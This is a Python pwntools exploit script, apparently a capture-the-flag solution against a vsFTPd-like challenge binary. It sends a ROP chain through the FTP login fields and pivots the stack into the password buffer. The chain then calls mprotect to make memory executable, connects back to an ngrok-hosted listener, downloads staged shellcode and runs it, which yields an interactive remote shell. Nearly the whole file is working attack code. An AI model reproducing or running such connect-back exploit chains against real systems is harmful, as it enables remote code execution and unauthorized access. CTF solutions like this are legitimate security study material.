#!/usr/bin/env python3
from pwn import *

subprocess.check_call(["make", "fmt", "all"])
with open("stage0.bin", "rb") as fp:
    STAGE0 = fp.read()
with open("stage1.bin", "rb") as fp:
    STAGE1 = fp.read()
with open("stage2.bin", "rb") as fp:
    STAGE2 = fp.read()
STAGE0_ADDR = 0x400000
MPROTECT = 0x4303B0
READ = 0x42F810
POP_RDI = 0x4024B8
POP_RSI = 0x4097F2
POP_RDX = 0x4018E4
MOV_RDI_RAX = 0x4018DE
PAGE_SIZE = 0x1000
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
SYSCALL = 0x4111D2
POP_RAX = 0x42F8E7
NR_SOCKET = 41
AF_INET = 2
SOCK_STREAM = 1
EXAMPLE_ARGV = 0x7FFFFFFFD9B8
EXAMPLE_PASSWORD = 0x7FFFFFFFD6F0
SUB_RAX_RDI = 0x429144
LONG_MAX = 0x7FFFFFFFFFFFFFFF
NR_CONNECT = 42
INFINITE_LOOP = 0x45de68
ROP_PIVOT = b"".join(
    (
        # padding
        struct.pack("<Q", 0),
        # rax = argv
        #     mov     rax, r12
        #     pop     r12
        #     retn
        struct.pack("<QQ", 0x404735, 0),
        # rdi = argv - password
        struct.pack("<QQ", POP_RDI, EXAMPLE_ARGV - EXAMPLE_PASSWORD),
        # rax = password
        struct.pack("<Q", SUB_RAX_RDI),
        # rsi = LONG_MAX
        struct.pack("<QQ", POP_RSI, LONG_MAX),
        # rcx = password
        #     mov     rcx, rax
        #     jmp     short loc_40F7B9
        #     loc_40F7B9:
        #     cmp     rsi, rcx
        #     jb      short loc_40F7B0
        #     lea     eax, [rdx+rdi]
        #     retn
        struct.pack("<Q", 0x40F7A6),
        # Piece of ROP_STAGE0
        struct.pack("<QQ", POP_RAX, NR_SOCKET),
        struct.pack("<QQ", POP_RDI, AF_INET),
        # Pivot to password
        #     mov     rsp, rcx
        #     pop     rcx
        #     jmp     rcx
        struct.pack("<Q", 0x474F49),
    )
).ljust(0x98, b"\x00")
assert len(ROP_PIVOT) == 0x98
# ngrok tcp 4444
PUBLIC_HOST = "2.tcp.eu.ngrok.io"
PUBLIC_PORT = 19954
PRIVATE_HOST = "localhost"
PRIVATE_PORT = 4444
SOCKADDR_IN = b"".join(
    (
        struct.pack("<H", AF_INET),
        struct.pack(">H", PUBLIC_PORT),
        bytes(
            int(address_byte)
            for address_byte in socket.gethostbyname(PUBLIC_HOST).split(".")
        ),
        struct.pack("<Q", 0),  # sin_zero
    )
)
assert len(SOCKADDR_IN) == 16
SOCK_FD = 0
ROP_STAGE0 = (
    b"".join(
        (
            struct.pack("<QQ", POP_RSI, SOCK_STREAM),
            struct.pack("<QQ", POP_RDX, 0),
            struct.pack("<Q", SYSCALL),
            struct.pack("<QQ", POP_RDI, STAGE0_ADDR),
            struct.pack("<QQ", POP_RSI, PAGE_SIZE),
            struct.pack("<QQ", POP_RDX, PROT_READ | PROT_WRITE | PROT_EXEC),
            struct.pack("<Q", MPROTECT),
            struct.pack("<QQ", POP_RSI, STAGE0_ADDR - 0x18),
            struct.pack("<QQ", POP_RDX, struct.unpack("<Q", SOCKADDR_IN[:8])[0]),
            # mov     [rsi+18h], rdx
            # retn
            struct.pack("<Q", 0x469BD8),
            struct.pack("<QQ", POP_RAX, NR_CONNECT),
            struct.pack("<QQ", POP_RDI, SOCK_FD),
            struct.pack("<QQ", POP_RSI, STAGE0_ADDR),
            struct.pack("<QQ", POP_RDX, len(SOCKADDR_IN)),
            struct.pack("<Q", SYSCALL),
            struct.pack("<QQ", POP_RDI, SOCK_FD),
            # Already set above
            # struct.pack("<QQ", POP_RSI, STAGE0),
            struct.pack("<QQ", POP_RDX, len(STAGE0)),
            struct.pack("<Q", READ),
            struct.pack("<Q", STAGE0_ADDR),
        )
    )
).ljust(0x100, b"\x00")
assert len(ROP_STAGE0) == 0x100, hex(len(ROP_STAGE0))
ROP_PASSWORD = ROP_STAGE0[:0x80]
ROP_USERNAME = ROP_STAGE0[0x80:0x100]
VLNEXT = b"\x16"
VEOF = b"\x04"


def connect():
    if args.LOCAL:
        tube = gdb.debug("dist/initramfs/home/user/i_am_not_backdoor.bin", api=True)
        tube.gdb.execute("b *0x401d05")  # return from main()
        tube.gdb.continue_nowait()
        return tube
    elif args.LOCAL_VM:
        return remote("localhost", 22222)
    else:
        return remote("seccomphell.chal.hitconctf.com", 50123)


def tty_escape(bs):
    if args.LOCAL:
        return bs
    result = bytearray()
    for b in bs:
        result.extend(VLNEXT)
        result.append(b)
    result.extend(VEOF)
    return result


def rop():
    with connect() as tube:
        tube.sendafter(b"220 (vsFTPd 2.3.4)", tty_escape(ROP_USERNAME + ROP_PASSWORD + ROP_PIVOT))
        tube.recvuntil(b"331 Please specify the password.")
        tube.recvuntil(b"530 Login incorrect.")
        #tube.recvall()
        time.sleep(3600)


def main():
    tube = listen(port=PRIVATE_PORT, bindaddr=PRIVATE_HOST)
    Thread(target=rop, daemon=True).start()
    tube.wait_for_connection()
    tube.send(STAGE0 + STAGE1 + STAGE2)
    tube.interactive()


if __name__ == "__main__":
    main()
